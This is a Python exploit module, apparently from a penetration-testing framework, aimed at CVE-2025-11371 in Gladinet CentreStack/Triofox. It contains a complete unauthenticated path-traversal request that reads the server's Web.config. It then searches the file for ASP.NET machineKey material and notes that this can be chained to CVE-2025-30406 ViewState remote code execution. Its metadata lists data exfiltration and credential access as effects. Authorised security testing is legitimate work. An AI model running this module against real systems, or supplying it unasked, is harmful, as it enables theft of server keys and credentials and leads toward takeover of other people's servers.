#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Gladinet CentreStack/Triofox unauthenticated LFI (CVE-2025-11371)."""

import re
import urllib.parse

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Gladinet CentreStack/Triofox LFI (CVE-2025-11371)',
        'description': (
            'Unauthenticated local file inclusion via GET /storage/t.dn?s=<traversal> '
            '(UploadDownloadProxy TempDownload). Commonly used to read Web.config and '
            'extract ASP.NET machine keys (chain to CVE-2025-30406 ViewState RCE).'
        ),
        'author': ['KittySploit Team', 'Huntress'],
        'cve': ['CVE-2025-11371'],
        'platform': Platform.WINDOWS,
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2025-11371',
            'https://www.huntress.com/blog/gladinet-centrestack-triofox-local-file-inclusion-flaw',
        ],
        'tags': ['gladinet', 'centrestack', 'triofox', 'lfi', 'file-read', 'unauth', 'kev'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration', 'credential_access'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals', 'credentials'],
            'cost': 1.2,
            'noise': 0.35,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'scanner/http/cve_2025_11371_detect',
                    'scanner/http/gladinet_centrestack_detect',
                ],
            },
        },
    }

    file_target = OptString(
        '..\\..\\..\\Program Files (x86)\\Gladinet Cloud Enterprise\\root\\Web.config',
        'Relative path passed in the s= query parameter',
        required=False,
    )
    sid = OptString('1', 'sid query parameter', required=False, advanced=True)
    output_file = OptString('', 'Local path to save retrieved content', required=False)
    output_limit = OptInteger(12000, 'Max chars printed when output_file empty (0=all)', required=False, advanced=True)

    def execute(self, file_path: str) -> str:
        target = str(file_path or self.file_target or '').strip()
        if not target:
            return ''
        qs = urllib.parse.urlencode({'s': target, 'sid': str(self.sid or '1')})
        path = f'/storage/t.dn?{qs}'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return ''
        return r.text or ''

    def check(self):
        body = self.execute(str(self.file_target or ''))
        if body and re.search(r'<configuration|<machineKey', body, re.I):
            return {
                'vulnerable': True,
                'reason': 'CVE-2025-11371: Web.config readable via /storage/t.dn',
                'confidence': 'high',
            }
        if body and '[fonts]' in body.lower():
            return {
                'vulnerable': True,
                'reason': 'CVE-2025-11371: system file readable',
                'confidence': 'high',
            }
        return {'vulnerable': False, 'reason': 'LFI probe failed', 'confidence': 'medium'}

    def run(self):
        remote = str(self.file_target or '').strip()
        data = self.execute(remote)
        if not data:
            print_error('File read failed (wrong path or patched)')
            return False
        print_success(f'Read {len(data)} bytes via CVE-2025-11371')
        if re.search(r'machineKey', data, re.I):
            print_warning('machineKey material present — review for CVE-2025-30406 chaining')
        local = str(self.output_file or '').strip()
        if local:
            try:
                with open(local, 'w', encoding='utf-8', errors='ignore') as fh:
                    fh.write(data)
                print_success(f'Wrote content to {local}')
            except OSError as exc:
                print_error(f'Could not write output_file: {exc}')
                return False
        else:
            limit = int(self.output_limit or 0)
            snippet = data if not limit or len(data) <= limit else data[:limit] + '\n... [truncated]'
            print_info(snippet)
        return True
